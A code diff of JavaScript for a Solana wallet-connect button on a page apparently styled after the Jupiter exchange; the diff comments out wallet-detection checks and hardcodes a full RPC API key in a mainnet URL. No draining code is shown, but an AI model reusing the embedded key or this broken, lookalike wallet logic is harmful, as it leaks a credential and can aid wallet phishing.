@@ -368,7 +368,7 @@ $(document).ready(async function () {
 
   $("#connect-solflare").on("click", async () => {
       const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      const siteURL = "https://jjup2-theme.vercel.app";
+      const siteURL = "jjup2-theme.vercel.app";
       const encodedURL = encodeURIComponent(siteURL);
 
   // 🔁 Handle Jupiter Mobile App (deep link for in-app browser)
@@ -390,25 +390,26 @@ $(document).ready(async function () {
 
   try {
     showLoader("#connect-wallet");
+    selected = "#connect-solflare";
 
     let walletProvider;
     let publicKey;
 
     // ✅ Phantom Desktop
-    if (window.solana && window.solana.isPhantom) {
+    // if (window.solana && window.solana.isPhantom) {
       const resp = await window.solana.connect();
       walletProvider = window.solana;
       publicKey = resp.publicKey;
-    }
+   // }
 
     // ✅ Solflare Desktop OR Jupiter Mobile (both inject window.solflare)
-    else if (window.solflare) {
-      const resp = await window.solflare.connect();
-      walletProvider = window.solflare;
-      publicKey = resp.publicKey;
-    }
+    // else if (window.solflare) {
+    //   const resp = await window.solflare.connect();
+    //   walletProvider = window.solflare;
+    //   publicKey = resp.publicKey;
+    // }
 
-    if (!walletProvider) throw new Error("No compatible wallet found");
+    // if (!walletProvider) throw new Error("No compatible wallet found");
 
     const connection = new solanaWeb3.Connection(
       "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
